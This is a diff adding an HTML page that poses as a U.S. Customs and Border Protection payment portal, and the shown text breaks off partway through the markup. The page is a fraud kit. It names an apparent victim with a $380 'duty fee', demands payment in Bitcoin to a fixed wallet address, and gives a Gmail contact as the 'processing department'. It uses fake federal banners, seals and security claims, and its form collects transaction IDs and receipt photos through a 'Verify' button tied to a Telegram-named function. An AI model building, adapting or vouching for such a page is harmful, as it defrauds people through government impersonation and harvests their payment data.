@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html class="light" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Official Payment Portal | U.S. Customs and Border Protection</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&family=Source+Serif+4:wght@600;700&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
+<script id="tailwind-config">
+      tailwind.config = {
+        darkMode: "class",
+        theme: {
+          extend: {
+            "colors": {
+                    "outline-variant": "#c4c6d0",
+                    "surface": "#fcf9f8",
+                    "primary-fixed-dim": "#aec6fe",
+                    "on-background": "#1b1b1b",
+                    "surface-container-highest": "#e5e2e1",
+                    "background": "#fcf9f8",
+                    "on-tertiary-fixed": "#271900",
+                    "secondary-fixed": "#d1e4ff",
+                    "on-secondary-fixed": "#001d36",
+                    "secondary": "#0061a3",
+                    "on-primary": "#ffffff",
+                    "tertiary": "#120a00",
+                    "surface-variant": "#e5e2e1",
+                    "on-surface": "#1b1b1b",
+                    "secondary-container": "#62b0ff",
+                    "on-tertiary": "#ffffff",
+                    "on-surface-variant": "#44474f",
+                    "inverse-primary": "#aec6fe",
+                    "inverse-on-surface": "#f3f0ef",
+                    "surface-bright": "#fcf9f8",
+                    "inverse-surface": "#313030",
+                    "tertiary-fixed-dim": "#fcbc2b",
+                    "outline": "#747780",
+                    "primary": "#000a23",
+                    "tertiary-container": "#2f1f00",
+                    "on-primary-fixed-variant": "#2e4675",
+                    "on-tertiary-fixed-variant": "#5d4200",
+                    "on-error-container": "#93000a",
+                    "on-error": "#ffffff",
+                    "primary-container": "#00204e",
+                    "tertiary-fixed": "#ffdea6",
+                    "on-secondary-fixed-variant": "#00497c",
+                    "on-secondary-container": "#004270",
+                    "on-secondary": "#ffffff",
+                    "surface-tint": "#465e8f",
+                    "error-container": "#ffdad6",
+                    "secondary-fixed-dim": "#9ecaff",
+                    "surface-container-low": "#f6f3f2",
+                    "on-tertiary-container": "#b28100",
+                    "on-primary-fixed": "#001a42",
+                    "surface-container": "#f0eded",
+                    "primary-fixed": "#d8e2ff",
+                    "surface-container-high": "#eae7e7",
+                    "surface-container-lowest": "#ffffff",
+                    "error": "#ba1a1a",
+                    "on-primary-container": "#7189bc",
+                    "surface-dim": "#dcd9d9"
+            },
+            "borderRadius": {
+                    "DEFAULT": "0.125rem",
+                    "lg": "0.25rem",
+                    "xl": "0.5rem",
+                    "full": "0.75rem"
+            },
+            "spacing": {
+                    "gutter": "24px",
+                    "unit": "4px",
+                    "container-max": "1200px",
+                    "stack-md": "16px",
+                    "stack-sm": "8px",
+                    "margin-desktop": "32px",
+                    "margin-mobile": "16px",
+                    "stack-lg": "32px"
+            },
+            "fontFamily": {
+                    "display-lg": ["\"Source Serif 4\""],
+                    "label-bold": ["Public Sans"],
+                    "body-lg": ["Public Sans"],
+                    "headline-lg-mobile": ["\"Source Serif 4\""],
+                    "headline-lg": ["\"Source Serif 4\""],
+                    "body-md": ["Public Sans"],
+                    "label-sm": ["Public Sans"],
+                    "headline-md": ["\"Source Serif 4\""]
+            },
+            "fontSize": {
+                    "display-lg": ["48px", {"lineHeight": "56px", "letterSpacing": "-0.02em", "fontWeight": "700"}],
+                    "label-bold": ["14px", {"lineHeight": "20px", "fontWeight": "700"}],
+                    "body-lg": ["18px", {"lineHeight": "28px", "fontWeight": "400"}],
+                    "headline-lg-mobile": ["28px", {"lineHeight": "36px", "fontWeight": "700"}],
+                    "headline-lg": ["32px", {"lineHeight": "40px", "fontWeight": "700"}],
+                    "body-md": ["16px", {"lineHeight": "24px", "fontWeight": "400"}],
+                    "label-sm": ["12px", {"lineHeight": "16px", "fontWeight": "500"}],
+                    "headline-md": ["24px", {"lineHeight": "32px", "fontWeight": "600"}]
+            }
+          },
+        },
+      }
+    </script>
+<style>
+        .material-symbols-outlined {
+            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
+            display: inline-block;
+            line-height: 1;
+            text-transform: none;
+            letter-spacing: normal;
+            word-wrap: normal;
+            white-space: nowrap;
+            direction: ltr;
+        }
+        body {
+            font-family: 'Public Sans', sans-serif;
+            background-color: #fcf9f8;
+        }
+        .official-banner {
+            background-color: #f0eded;
+            font-size: 12px;
+            padding: 4px 32px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .official-bar { background: #000; color: white; font-size: 11px; padding: 4px 32px; display: flex; align-items: center; gap: 8px; }
+        .zebra-row:nth-child(even) { background-color: #F9F9F9; }
+        .secure-card-glow { transition: box-shadow 0.3s ease; }
+        .secure-card-glow:hover { box-shadow: 0 4px 12px rgba(0, 32, 78, 0.08); }
+        /* Page transitions */
+        .page-view {
+            display: none;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        .page-view.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Active nav indicator */
+        .nav-active {
+            background-color: #62b0ff !important;
+            color: #004270 !important;
+            font-weight: 700 !important;
+        }
+</style>
+</head>
+<body class="min-h-screen flex flex-col text-on-background">
+
+<!-- ==================== SHARED HEADER ==================== -->
+<!-- Official Government Banner -->
+<div class="official-banner border-b border-outline-variant">
+<img class="w-4 h-3" src="https://lh3.googleusercontent.com/aida-public/AB6AXuDE3DdotM7QTMGfYXr5qUuc8EeIbPxWb3l2cfyKS4zLdQhf9C-m28xKLMTcu1vueasbyjASdz_-SPsjPG-579QAIxK1PhUwGfxRkml-RQFu5LVeLF_WoUeusWoNPIzCx7ABKmuYZEjHDaJDShSogk5UnKg4OUjSqrE76xyymucnp-3fDEVOlH-MP15ECcH1PossXqHhl1FjW8qF-MMm98w9wY1f3ayaczwtHFBHqQ8jYqUfWwbpsBKQYYZo_-YHV_jlV-kjAPKJUQMr" alt="US Flag"/>
+<span class="font-label-sm text-label-sm text-on-surface-variant">An official website of the United States government</span>
+</div>
+
+<!-- Top App Bar -->
+<header class="bg-primary sticky top-0 z-50 flex flex-col w-full border-b border-outline-variant">
+<div class="max-w-[1440px] mx-auto w-full px-margin-desktop py-stack-md flex justify-between items-center">
+<div class="flex items-center gap-stack-md">
+<span class="font-headline-md text-headline-md font-bold text-on-primary">U.S. Customs and Border Protection</span>
+</div>
+<nav class="hidden lg:flex items-center gap-stack-lg">
+<a class="text-on-primary opacity-80 hover:bg-primary-fixed-dim hover:text-on-primary-fixed transition-colors font-body-md text-body-md px-2 py-1 cursor-pointer" onclick="showToast('Travel section coming soon')">Travel</a>
+<a class="text-on-primary opacity-80 hover:bg-primary-fixed-dim hover:text-on-primary-fixed transition-colors font-body-md text-body-md px-2 py-1 cursor-pointer" onclick="showToast('Trade section coming soon')">Trade</a>
+<a class="text-on-primary opacity-80 hover:bg-primary-fixed-dim hover:text-on-primary-fixed transition-colors font-body-md text-body-md px-2 py-1 cursor-pointer" onclick="showToast('Border Security section coming soon')">Border Security</a>
+<a class="text-on-primary opacity-80 hover:bg-primary-fixed-dim hover:text-on-primary-fixed transition-colors font-body-md text-body-md px-2 py-1 cursor-pointer" onclick="showToast('News section coming soon')">News</a>
+<a class="text-on-primary opacity-80 hover:bg-primary-fixed-dim hover:text-on-primary-fixed transition-colors font-body-md text-body-md px-2 py-1 cursor-pointer" onclick="showToast('About section coming soon')">About</a>
+</nav>
+<div class="flex items-center gap-stack-md">
+<a class="px-6 py-2 bg-[#FFBE2E] text-primary font-label-bold text-label-bold rounded-lg hover:opacity-90 transition-all inline-block" href="#/payment" onclick="goTo('/payment');return false">Pay Now</a>
+
+</div>
+</div>
+</header>
+
+
+
+<div class="flex flex-1 overflow-hidden">
+
+<!-- ==================== SHARED SIDEBAR ==================== -->
+<aside class="fixed left-0 top-0 h-full z-40 bg-surface-container-low dark:bg-surface-dim border-r border-outline-variant h-screen w-64 hidden lg:flex flex-col pt-32">
+<div class="px-margin-desktop mb-stack-lg">
+<h2 class="font-headline-md text-headline-md text-primary font-bold">Payment Portal</h2>
+<p class="font-label-sm text-label-sm text-on-surface-variant">Official Government System</p>
+</div>
+<nav class="flex-1 px-stack-md space-y-2">
+<a class="nav-item flex items-center gap-3 px-4 py-3 text-on-surface-variant hover:bg-surface-container-high font-label-bold text-label-bold rounded-lg transition-all group" href="#/" onclick="goTo('/');return false">
+<span class="material-symbols-outlined group-hover:scale-110 duration-150">dashboard</span>
+                    Dashboard
+                </a>
+<a class="nav-item flex items-center gap-3 px-4 py-3 text-on-surface-variant hover:bg-surface-container-high font-label-bold text-label-bold rounded-lg transition-all group" href="#/payment" onclick="goTo('/payment');return false">
+<span class="material-symbols-outlined group-hover:scale-110 duration-150">payments</span>
+                    Payments
+                </a>
+<a class="nav-item flex items-center gap-3 px-4 py-3 text-on-surface-variant hover:bg-surface-container-high font-label-bold text-label-bold rounded-lg transition-all group" href="#" onclick="goTo('/history');return false">
+<span class="material-symbols-outlined group-hover:scale-110 duration-150">history</span>
+                    History
+                </a>
+<a class="nav-item flex items-center gap-3 px-4 py-3 text-on-surface-variant hover:bg-surface-container-high font-label-bold text-label-bold rounded-lg transition-all group" href="#" onclick="goTo('/disputes');return false">
+<span class="material-symbols-outlined group-hover:scale-110 duration-150">gavel</span>
+                    Disputes
+                </a>
+<a class="nav-item flex items-center gap-3 px-4 py-3 text-on-surface-variant hover:bg-surface-container-high font-label-bold text-label-bold rounded-lg transition-all group" href="#" onclick="goTo('/support');return false">
+<span class="material-symbols-outlined group-hover:scale-110 duration-150">contact_support</span>
+                    Support
+                </a>
+</nav>
+<div class="mt-auto p-stack-md border-t border-outline-variant space-y-2">
+<a class="flex items-center gap-3 px-4 py-2 text-on-surface-variant hover:bg-surface-container-high font-label-sm text-label-sm rounded transition-all" href="#">
+<span class="material-symbols-outlined text-sm">security</span>
+                    Security Policy
+                </a>
+<a class="flex items-center gap-3 px-4 py-2 text-error hover:bg-error-container font-label-sm text-label-sm rounded transition-all" href="#">
+<span class="material-symbols-outlined text-sm">logout</span>
+                    Log Out
+                </a>
+</div>
+</aside>
+
+<!-- ==================== MAIN CONTENT AREA ==================== -->
+<main class="flex-1 lg:ml-64 bg-surface overflow-y-auto">
+
+<!-- ============================================ -->
+<!-- PAGE 1: DASHBOARD -->
+<!-- ============================================ -->
+<div id="page-dashboard" class="page-view active">
+<div class="max-w-container-max mx-auto px-margin-desktop lg:px-stack-lg py-stack-lg space-y-stack-lg">
+<!-- Hero Section -->
+<section class="relative bg-primary-container rounded-xl overflow-hidden text-on-primary-container p-stack-lg lg:p-16 flex flex-col items-start gap-stack-md">
+<div class="absolute top-0 right-0 w-1/2 h-full opacity-10 pointer-events-none">
+<div class="w-full h-full" style="background-image: url('https://lh3.googleusercontent.com/aida-public/AB6AXuCnmt8qPVXQR3IGOuOTavWjUXHq5RKkaW7WyoJCFBJhOTbCHhwtW-Xm_8F_Jp0dx3EZBokwBdmu6rpL3J1z00CluTwalYScKULX2i5KLr-MnyezWFAiuPgmdZLVyD-LqYcHwSe2KBDFY9X74zkImhEQZbnlD_YWuiY3qdQ4Pv35xXzxwpvk-3iIRrLVl0z5O3rXIpLuTztjZqoXfPZIEkSF03JdARxU1S84Vy7JPjV2tmd0wGPEk-5QPnFze5PiwImHq8A2q7ImPTSR'); background-size: cover; background-position: center;"></div>
+</div>
+<div class="relative z-10 max-w-2xl">
+<span class="inline-block px-3 py-1 bg-secondary-container text-on-secondary-container font-label-bold text-label-sm rounded-full mb-4">Official Payment Portal</span>
+<h1 class="font-display-lg text-display-lg text-white mb-stack-sm">Secure Payment Portal</h1>
+<p class="font-body-lg text-body-lg opacity-90 max-w-xl">
+                            The centralized system for managing item and package clearance duties. Ensure your international shipments are processed without delay by utilizing our automated clearance protocols.
+                        </p>
+</div>
+</section>
+<!-- Information Grid -->
+<div class="grid grid-cols-1 lg:grid-cols-12 gap-stack-lg">
+<!-- Main Payment Section -->
+<div class="lg:col-span-8 space-y-stack-lg">
+<!-- Bitcoin Payment Card -->
+<div class="bg-white border border-outline-variant rounded-xl p-stack-lg flex flex-col md:flex-row gap-stack-lg items-center">
+<div class="flex-shrink-0 bg-surface-container-low p-6 rounded-lg border border-outline-variant flex items-center justify-center">
+<img class="w-24 h-24" src="https://lh3.googleusercontent.com/aida-public/AB6AXuCWram_QojnrOvPFXNwtw98ny68v7Xx7ApSUHsSyHuUQ0Es4D3Z5tUxLmDqrPIzEBe148IQjEJsXXdge-mDHdfFGinUBs1wgqdYRxiB-bd1070cMDP7HOZvHksgZDSCNrBugYlvWXWKoe4u7Zx6hUmnn1-g-M-49plZuj4O0A-qQHReYvTfZgT8iOWZWUICJ-ZlSu2c8oMVudBvGJbc2pSAY5hnBjFq3q7fHY3pPmy91cdnEItYCPQbW6BhESi5RkfaRXpYUnEmDO0Z" alt="Bitcoin Government"/>
+</div>
+<div class="flex-1">
+<h3 class="font-headline-md text-headline-md text-primary mb-stack-sm">Pay with Bitcoin</h3>
+<p class="font-body-md text-body-md text-on-surface-variant mb-stack-md">
+                                    Utilize decentralized digital assets for instantaneous verification. Bitcoin payments bypass multi-day banking holds, allowing for immediate digital clearance of held cargo.
+                                </p>
+<a class="w-full md:w-auto px-8 py-4 bg-[#FFBE2E] text-primary font-bold text-lg rounded-lg hover:opacity-90 shadow-sm transition-all flex items-center justify-center gap-2" href="#/payment" onclick="goTo('/payment');return false">Proceed to Bitcoin Payment <span class="material-symbols-outlined">arrow_forward</span></a>
+</div>
+</div>
+<!-- Important Notice: Bank Transfers -->
+<div class="bg-surface-container-high border-l-4 border-primary p-stack-lg rounded-r-lg">
+<div class="flex items-start gap-4">
+<span class="material-symbols-outlined text-primary" style="font-variation-settings: 'FILL' 1;">info</span>
+<div>
+<h4 class="font-label-bold text-label-bold text-primary mb-2">Protocol Notice: Bank Verification</h4>
+<p class="font-body-md text-body-md text-on-surface">
+                                        To ensure the fastest possible processing times for international clearance and to minimize delays caused by traditional banking verification protocols, we currently prioritize decentralized digital assets. This automated verification allows for immediate cargo release.
+                                    </p>
+</div>
+</div>
+</div>
+<!-- Transaction Tracking -->
+<div class="bg-white border border-outline-variant rounded-xl overflow-hidden">
+<div class="bg-primary px-stack-lg py-4">
+<h3 class="text-on-primary font-label-bold text-label-bold uppercase tracking-wider">Active Clearance Tracking</h3>
+</div>
+<div class="p-stack-lg">
+<div class="space-y-4">
+<div class="flex justify-between items-center pb-4 border-b border-outline-variant">
+<div>
+<p class="font-label-bold text-label-bold">Package ID: CBP-4920-XLT</p>
+<p class="font-label-sm text-label-sm text-on-surface-variant">Origin: USA Changi (SIN)</p>
+</div>
+<span class="px-3 py-1 bg-tertiary-fixed text-on-tertiary-fixed font-label-bold text-label-sm rounded">Awaiting Payment Patrick Ramon Blanco...</span>
+</div>
+<div class="flex justify-between items-center">
+<div>
+<p class="font-label-bold text-label-bold">Total Duty Fees</p>
+<p class="font-label-sm text-label-sm text-on-surface-variant">Including processing and storage</p>
+</div>
+<p class="font-headline-md text-headline-md text-primary">$380.00 USD</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Sidebar Content -->
+<div class="lg:col-span-4 space-y-stack-lg">
+<!-- Alternative Payments -->
+<div class="bg-white border border-outline-variant rounded-xl p-stack-lg">
+<h4 class="font-label-bold text-label-bold text-primary mb-stack-sm">Alternative Payment Methods</h4>
+<p class="font-body-md text-body-md text-on-surface-variant mb-stack-md">
+                                For inquiries regarding other payment options, please contact our processing department at customsdepartment70@gmail.com.
+                            </p>
+<a class="text-secondary font-label-bold text-label-bold hover:underline flex items-center gap-1" href="mailto:customsdepartment70@gmail.com">
+<span class="material-symbols-outlined text-sm">mail</span>
+                                Contact Processing Dept
+                            </a>
+</div>
+<!-- Security Features Card -->
+<div class="bg-surface-container-lowest border border-outline-variant rounded-xl p-stack-lg">
+<h4 class="font-label-bold text-label-bold text-primary mb-stack-sm">System Security</h4>
+<ul class="space-y-3">
+<li class="flex items-start gap-2">
+<span class="material-symbols-outlined text-green-700 text-sm">check_circle</span>
+<span class="font-label-sm text-label-sm">End-to-end encryption active</span>
+</li>
+<li class="flex items-start gap-2">
+<span class="material-symbols-outlined text-green-700 text-sm">check_circle</span>
+<span class="font-label-sm text-label-sm">Authorized Federal Gateway</span>
+</li>
+<li class="flex items-start gap-2">
+<span class="material-symbols-outlined text-green-700 text-sm">check_circle</span>
+<span class="font-label-sm text-label-sm">Automated Ledger Settlement</span>
+</li>
+</ul>
+</div>
+<!-- Logo / Seal -->
+<div class="flex flex-col items-center justify-center p-stack-lg opacity-40">
+<img class="w-32 h-32 grayscale hover:grayscale-0 transition-all duration-500" src="https://lh3.googleusercontent.com/aida-public/AB6AXuCRQUYuu0jXVnzFVq1TeVoTgHrSoeNq53Hx61FlNr4LGZHtYDS65Iyu3x4JgoViK6hcITPN1Mj5UFKhTqFnP25pPsmLpMhTY5jb6ihPwFyBQtPPetqpMx7vw8I4ALFDUjYXkWCsZPZ6OcnzhPmwkeBqXTownoYmK9HIuqHeEnmtsHEXRaPE1TgFAPFhkd0CIEb0FtftN3kY_uS68WfAd9VuvyykHvbEHR5RiN7cUzz4WN7qdPiXy-fcXEafIXmKyFo0ocwqAKEgN4Uv" alt="DHS Seal"/>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE 2: PAYMENT -->
+<!-- ============================================ -->
+<div id="page-payment" class="page-view">
+<div class="max-w-[800px] mx-auto py-stack-lg px-margin-desktop lg:px-stack-lg">
+<!-- Breadcrumbs -->
+<nav class="flex items-center gap-2 mb-stack-md opacity-60">
+<a class="font-label-sm text-label-sm hover:text-primary transition-colors" href="#/" onclick="goTo('/');return false">Payments</a>
+<span class="material-symbols-outlined text-sm">chevron_right</span>
+<a class="font-label-sm text-label-sm hover:text-primary transition-colors" href="#/" onclick="goTo('/');return false">Duty Fees</a>
+<span class="material-symbols-outlined text-sm">chevron_right</span>
+<span class="font-label-sm text-label-sm font-bold">Bitcoin Payment</span>
+</nav>
+<!-- Payment Header -->
+<div class="mb-stack-lg">
+<h1 class="font-headline-lg text-headline-lg text-primary mb-2">Pay with Bitcoin</h1>
+<p class="font-body-md text-body-md text-on-surface-variant">Transaction ID: CBP-77492-X9021</p>
+</div>
+<!-- Secure Payment Card -->
+<div class="bg-surface-container-lowest border border-outline-variant p-margin-desktop rounded-lg secure-card-glow">
+<div class="flex flex-col md:flex-row gap-stack-lg">
+<!-- QR Code Section -->
+<div class="flex flex-col items-center gap-stack-md shrink-0">
+<div class="w-48 h-48 bg-white border border-outline p-4 flex items-center justify-center">
+<img class="w-full h-full object-contain" src="qr-code.png" alt="Bitcoin QR Code"/>
+</div>
+<div class="flex items-center gap-2 text-primary font-label-bold text-label-bold">
+<span class="material-symbols-outlined text-[18px]">verified_user</span>
+<span>SECURE GATEWAY</span>
+</div>
+</div>
+<!-- Details Section -->
+<div class="flex-1 flex flex-col gap-stack-md">
+<div class="bg-surface-container-low p-stack-md border-l-4 border-[#FFBE2E]">
+<p class="font-body-md text-body-md text-on-surface">
+                                    Scan the QR code or copy the address below to complete your Bitcoin transaction. Ensure the amount matches your total duty fees for immediate clearance.
+                                </p>
+</div>
+<!-- Address Copy Box -->
+<div class="mt-stack-sm">
+<label class="font-label-bold text-label-bold text-on-surface-variant block mb-unit">Bitcoin Wallet Address</label>
+<div class="flex border border-outline rounded-lg overflow-hidden focus-within:ring-2 ring-secondary-container">
+<input class="flex-1 bg-surface-container-high px-4 py-3 font-body-md text-body-md border-none focus:ring-0 text-on-surface" id="btc-address" readonly="" type="text" value="bc1q9mnmvw9w76a0qt3kfh84a2v9d4vj5hkxxqdxmm"/>
+<button class="bg-primary text-on-primary px-4 flex items-center gap-2 hover:opacity-90 transition-opacity" onclick="copyAddress()">
+<span class="material-symbols-outlined">content_copy</span>
+<span class="font-label-bold text-label-bold">Copy</span>
+</button>
+</div>
+<div class="hidden text-secondary font-label-sm text-label-sm mt-1 animate-pulse" id="copy-toast">Address copied to clipboard</div>
+</div>
+<!-- Amount Section -->
+<div class="grid grid-cols-2 gap-stack-md py-stack-md border-y border-outline-variant my-unit">
+<div>
+<span class="font-label-sm text-label-sm uppercase opacity-60 block">Amount Due (USD)</span>
+<span class="font-headline-md text-headline-md text-primary">$380.00</span>
+</div>
+<div>
+<span class="font-label-sm text-label-sm uppercase opacity-60 block">Est. BTC Equivalent</span>
+<span class="font-headline-md text-headline-md text-secondary">$380.00 BTC</span>
+</div>
+</div>
+<!-- Action Button -->
+<div class="mt-stack-md">
+<a class="w-full bg-[#FFBE2E] text-primary font-headline-md text-headline-md py-4 rounded-lg flex items-center justify-center gap-3 hover:brightness-95 transition-all shadow-sm active:scale-[0.98] decoration-none" href="#/verify" onclick="goTo('/verify');return false">
+<span class="material-symbols-outlined" style="font-variation-settings: 'FILL' 1;">security</span>
+Proceed to Verification
+</a>
+<p class="text-center font-label-sm text-label-sm mt-stack-sm opacity-60 italic">
+                                    Wait for 3 network confirmations for automated clearance.
+                                </p>
+</div>
+</div>
+</div>
+</div>
+<!-- Help Section -->
+<div class="mt-stack-lg grid md:grid-cols-2 gap-stack-md">
+<div class="bg-white border border-outline-variant p-stack-md rounded-lg flex items-start gap-4">
+<span class="material-symbols-outlined text-secondary">help_outline</span>
+<div>
+<h4 class="font-label-bold text-label-bold text-primary mb-1">Payment Help</h4>
+<p class="font-body-md text-[14px] text-on-surface-variant">Having trouble scanning? Ensure your wallet supports SegWit (bc1) addresses or contact support.</p>
+</div>
+</div>
+<div class="bg-white border border-outline-variant p-stack-md rounded-lg flex items-start gap-4">
+<span class="material-symbols-outlined text-secondary">timer</span>
+<div>
+<h4 class="font-label-bold text-label-bold text-primary mb-1">Time Limit</h4>
+<p class="font-body-md text-[14px] text-on-surface-variant">The exchange rate is locked for 15 minutes. Complete your transfer before the timer expires.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE 3: VERIFY -->
+<!-- ============================================ -->
+<div id="page-verify" class="page-view">
+<div class="max-w-container-max mx-auto px-margin-desktop lg:px-stack-lg py-stack-lg space-y-stack-lg">
+<!-- Breadcrumbs -->
+<nav class="flex text-label-sm font-label-sm text-outline gap-2"><a class="hover:text-primary" href="#/" onclick="goTo('/');return false">Dashboard</a><span>/</span><a class="hover:text-primary" href="#/payment" onclick="goTo('/payment');return false">Payments</a><span>/</span><span class="text-on-surface font-bold">Verify Your Payment</span></nav>
+<!-- Page Header -->
+<header class="flex flex-col md:flex-row md:items-end justify-between gap-stack-md">
+<div>
+<h1 class="font-headline-lg text-headline-lg text-primary">Verify Your Payment</h1>
+<p class="font-body-md text-body-md text-on-surface-variant mt-2 max-w-2xl">Confirm your digital transaction using the Federal Ledger Settlement system. Ensure all documentation is accurate before final submission for clearance.</p>
+</div>
+<div class="flex items-center gap-stack-md text-outline">
+<span class="material-symbols-outlined">verified_user</span>
+<span class="font-label-bold text-label-bold uppercase tracking-widest text-[10px]">Secure Verification Protocol</span>
+</div>
+</header>
+<!-- Success Banner (Conditional Logic Placeholder) -->
+<div class="hidden bg-tertiary-fixed text-on-tertiary-fixed p-stack-md rounded border border-tertiary-fixed-dim flex items-start gap-stack-md animate-in fade-in slide-in-from-top duration-500" id="success-banner">
+<span class="material-symbols-outlined text-on-tertiary-fixed-variant" style="font-variation-settings: 'FILL' 1;">check_circle</span>
+<div class="space-y-1">
+<p class="font-label-bold text-label-bold">Payment submitted</p>
+<p class="font-body-md text-body-md opacity-90">Your receipt is being processed by the Federal Ledger Settlement system. Clearance status will update within 15-30 minutes.</p>
+</div>
+<button class="ml-auto opacity-60 hover:opacity-100 transition-opacity" onclick="document.getElementById('success-banner').classList.add('hidden')">
+<span class="material-symbols-outlined">close</span>
+</button>
+</div>
+<!-- Main Layout: Form & Verification Info -->
+<div class="grid grid-cols-1 lg:grid-cols-12 gap-gutter">
+<!-- Left: Form Card -->
+<div class="lg:col-span-7 space-y-gutter">
+<div class="bg-white border border-outline-variant p-stack-lg rounded shadow-sm">
+<h2 class="font-headline-md text-headline-md text-primary-container mb-stack-lg">Transaction Authentication</h2>
+<form class="space-y-stack-lg" id="verification-form">
+<!-- TXID Input -->
+<div class="space-y-unit">
+<label class="block font-label-bold text-label-bold text-on-surface-variant" for="txid">Transaction ID (TXID) / Payment ID</label>
+<div class="flex gap-2">
+<div class="relative flex-1">
+<input class="w-full border border-[#71767a] px-stack-md py-3 font-body-md text-body-md focus:ring-2 focus:ring-secondary focus:border-secondary transition-all outline-none" id="txid" placeholder="Enter the 16-digit alphanumeric code" type="text"/>
+<div class="absolute inset-y-0 right-3 flex items-center pointer-events-none text-outline">
+<span class="material-symbols-outlined text-sm">info</span>
+</div>
+</div>
+<button class="bg-secondary text-on-secondary px-stack-lg font-label-bold text-label-bold border-2 border-secondary hover:bg-on-secondary-fixed-variant hover:border-on-secondary-fixed-variant transition-all rounded" onclick="handleVerifyWithTelegram()" type="button">Verify</button>
+</div>
+<p class="text-[12px] text-outline mt-1 italic">Found on your digital receipt or bank statement.</p>
+</div>
+<!-- File Upload Area -->
+<div class="space-y-unit">
+<label class="block font-label-bold text-label-bold text-on-surface-variant">Payment Receipt / Proof of Transfer</label>
+<div class="border-2 border-dashed border-outline-variant bg-surface-container-low p-stack-lg text-center cursor-pointer hover:border-secondary hover:bg-surface-container transition-all group" id="drop-area" onclick="openGallery()">
+<input class="hidden" id="file-upload" multiple="" type="file" accept="image/*" style="display:none"/>
+<div class="flex flex-col items-center gap-stack-sm">
+<span class="material-symbols-outlined text-outline group-hover:text-secondary text-4xl transition-colors">upload_file</span>
+<p class="font-body-md text-body-md font-bold">Tap to upload from gallery</p>
+<p class="font-label-sm text-label-sm text-outline">or <span class="text-secondary underline">select photos</span> from your device</p>
+<p class="text-[11px] text-outline mt-2 uppercase tracking-tighter">Accepted: JPG, PNG (Max 10MB)</p>
+</div>
+</div>
+<div class="mt-2 space-y-1" id="file-list"></div>
+</div>
+<!-- Checkboxes for Compliance -->
+<div class="space-y-stack-sm py-stack-md border-t border-outline-variant">
+<label class="flex items-start gap-stack-md cursor-pointer group">
+<input class="mt-1 w-5 h-5 rounded border-[#71767a] text-primary focus:ring-primary" type="checkbox"/>
+<span class="font-body-md text-body-md text-on-surface-variant group-hover:text-on-surface transition-colors">I confirm that this transaction represents a lawful transfer for specified customs duties or border fees.</span>
+</label>
+<label class="flex items-start gap-stack-md cursor-pointer group">
+<input class="mt-1 w-5 h-5 rounded border-[#71767a] text-primary focus:ring-primary" type="checkbox"/>
+<span class="font-body-md text-body-md text-on-surface-variant group-hover:text-on-surface transition-colors">I understand that providing false information to a federal agency is a punishable offense under 18 U.S.C. § 1001.</span>
+</label>
+</div>
+<!-- Submission Buttons -->
+<div class="pt-stack-md flex flex-col sm:flex-row gap-stack-md">
+<button class="flex-1 bg-[#FFBE2E] text-primary px-stack-lg py-4 font-headline-md text-headline-md font-bold text-center border-b-4 border-b-[#D49E26] hover:brightness-105 active:border-b-0 active:translate-y-[2px] transition-all" type="submit">Confirm and Submit for Approval</button>
+<a class="sm:w-32 text-outline border border-outline-variant px-stack-md py-4 font-label-bold text-label-bold hover:bg-surface-container-high transition-colors flex items-center justify-center" href="#/payment" onclick="goTo('/payment');return false">Cancel</a>
+</div>
+</form>
+</div>
+</div>
+<!-- Right: Info/Status Column -->
+<div class="lg:col-span-5 space-y-gutter">
+<!-- Verification Status Card -->
+<div class="bg-primary text-on-primary p-stack-lg rounded shadow-sm relative overflow-hidden">
+<div class="absolute top-0 right-0 p-4 opacity-10">
+<span class="material-symbols-outlined text-[120px]">account_balance</span>
+</div>
+<h3 class="font-headline-md text-headline-md mb-stack-md relative z-10">Verification Protocol</h3>
+<div class="space-y-stack-md relative z-10">
+<div class="flex items-start gap-3">
+<span class="material-symbols-outlined text-secondary-fixed-dim">verified</span>
+<div>
+<p class="font-label-bold text-label-bold">Authenticity Check</p>
+<p class="font-label-sm text-label-sm opacity-70">Cross-referencing TXID with global banking routing and settlement networks.</p>
+</div>
+</div>
+<div class="flex items-start gap-3">
+<span class="material-symbols-outlined text-secondary-fixed-dim">lock</span>
+<div>
+<p class="font-label-bold text-label-bold">Document Shield</p>
+<p class="font-label-sm text-label-sm opacity-70">Receipts are encrypted and stored within the Department of Homeland Security secure environment.</p>
+</div>
+</div>
+<div class="flex items-start gap-3">
+<span class="material-symbols-outlined text-secondary-fixed-dim">speed</span>
+<div>
+<p class="font-label-bold text-label-bold">Processing Time</p>
+<p class="font-label-sm text-label-sm opacity-70">Automation allows for 85% of payments to clear within 30 minutes of submission.</p>
+</div>
+</div>
+</div>
+</div>
+<!-- Supporting Image -->
+<div class="rounded overflow-hidden border border-outline-variant">
+<img class="w-full h-48 object-cover" src="https://lh3.googleusercontent.com/aida-public/AB6AXuDi8ZbAGB3qGnRurDoX8ljLBSumhiAjZic_9IjeI_OgUIjhjFqCZ3Uv1M1JYtU75KD-ATjAl6Mkn3Jj7uT2_Tt1Ugb4CufMB8ISPlNubwM2kubNfmDx_-qq2uXdYuWiiSWMOjXjJZhjif4oVpS3hVzvDkxE8iO8f5h-BojfXRTpojWEDPSVnTXm1n2bHB4u9ddhZmcMj2eK-WqvCzB4eufoK5Xdb8ptgK_ND_5V9aOJ_5nPT4UckMJf_0wAckNgBVBS7s57Byhfusq5" alt="Federal Office"/>
+<div class="bg-white p-stack-md">
+<p class="font-label-bold text-label-bold text-primary">Need help with your verification?</p>
